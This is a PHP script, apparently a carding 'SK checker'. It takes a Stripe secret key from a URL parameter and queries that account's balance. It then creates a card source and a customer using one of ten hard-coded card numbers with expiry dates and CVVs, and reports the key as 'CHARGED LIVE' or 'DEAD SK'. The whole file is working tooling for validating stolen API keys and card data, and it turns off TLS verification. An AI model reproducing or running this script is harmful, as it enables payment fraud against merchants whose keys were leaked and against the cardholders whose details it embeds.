<?php



error_reporting(0);

ini_set('display_errors', 0);
function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


/*===[Variable Setup]=========================================*/
$sk = $_GET['lista'];

/*===[SK Info Validation]=====================================*/
if($sk == ""){
    exit();
}

/*===[CC Info Randomizer]=====================================*/

$cc_info_arr[] = "4427323412042742|11|2029|778";
$cc_info_arr[] = "4427323412047246|03|2025|056";
$cc_info_arr[] = "4427325078084744|11|2023|720";
$cc_info_arr[] = "4427323412486766|08|2024|555";
$cc_info_arr[] = "4427323412172176|08|2029|776";
$cc_info_arr[] = "4867320147781682|05|2029|237";
$cc_info_arr[] = "4427323412680368|07|2025|788";
$cc_info_arr[] = "4427323412367842|01|2025|124";
$cc_info_arr[] = "4427325012730451|04|2025|227";
$cc_info_arr[] = "4427325662058237|09|2029|708";
$n = rand(0,9);
$cc_info = $cc_info_arr[$n];




/*===[Variable Setup]=========================================*/
$i = explode("|", $cc_info);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$yy = substr($yyyy, 2, 4);
$cvv = $i[3];
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$m = ltrim($mm, "0");


##########balance

for ($retry = 0; $retry <= 100; $retry++)
{
$ch = curl_init(); 
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/balance');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    $result = curl_exec($ch);
  $s = json_decode($result, true);
  
  $payment_decode = json_decode($result, 1);
$payment_id = $payment_decode['id'];
$payment_error_code = $payment_decode['error']['code'];
$payment_decline_code = $payment_decode['error']['decline_code'];
$payment_message = $payment_decode['error']['message'];
$payment_cvc_check = $payment_decode['card']['cvc_check'];

if ($payment_error_code != 'rate_limit') {
    break;
}
}
$result;
$balance = Getstr($result,'"amount": ',',');
$currency = Getstr($result,'"currency": "','"');

#-------------------[1st REQ]--------------------#

for ($retry = 0; $retry <= 100; $retry++)
{
$ch = curl_init(); 
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=raramachine&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'');
    $result1 = curl_exec($ch);
  $s = json_decode($result1, true);
  $token = $s['id'];
  
  $payment_decode = json_decode($result1, 1);
$payment_id = $payment_decode['id'];
$payment_error_code = $payment_decode['error']['code'];
$payment_decline_code = $payment_decode['error']['decline_code'];
$payment_message = $payment_decode['error']['message'];
$payment_cvc_check = $payment_decode['card']['cvc_check'];

if ($payment_error_code != 'rate_limit') {
    break;
}
}
////////////

for ($retry = 0; $retry <= 100; $retry++)
{
if (isset($payment_id)) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'description=SKCHECK&source='.$token.'');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
   $result2 = curl_exec($ch);
 
 $intent_decode = json_decode($result2, 1);
$intent_id = $intent_decode['id'];
$intent_error_code = $intent_decode['error']['code'];
$intent_decline_code = $intent_decode['error']['decline_code'];
$intent_message = $intent_decode['error']['message'];



}
if ($intent_error_code != 'rate_limit') {
    break;
}
}
#############################

$message = Getstr($result1,'"message": "','"');
$dcode = Getstr($result1,'"code": "','"');

  $result1;
  $result2;


if (strpos($result2, '"decline_code": "generic_decline"')) {
    echo "[<font color=green>#CHARGED LIVE</font>]<br>[<font color=green>Balance:$balance</font>][<font color=green>Currency:$currency</font>]<br>[$sk]<br>==========================<br>";
    die();
}
else if (strpos($result1, '"decline_code": "generic_decline"')) {
    echo "[<font color=green>#CHARGED LIVE</font>]<br>[<font color=green>Balance:$balance</font>][<font color=green>Currency:$currency</font>]<br>[$sk]<br>==========================<<br>";
    die();
}
else if (strpos($result1, 'unchecked')) {
    echo "[<font color=green>#CHARGED LIVE</font>]<br>[<font color=green>Balance:$balance</font>][<font color=green>Currency:$currency</font>]<br>[$sk]<br>==========================<<br>";

    die();
}
else if (strpos($result2, 'unchecked')) {
    echo "[<font color=green>#CHARGED LIVE</font>]<br>[<font color=green>Balance:$balance</font>][<font color=green>Currency:$currency</font>]<br>[$sk]<br>==========================<<br>";

    die();
}
else {
  echo "<font color=blue>[<font color=red>DEAD SK</font>]<br>[<font color=red>sk is $dcode</font>]<br>[<font color=red>$message</font>]<br>[<font color=red>$sk</font>]<br>==========================<=<br>";
}



/*===[PHP Functions]==========================================*/
function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@gmail.com';
}

curl_close($ch);
ob_flush();
?>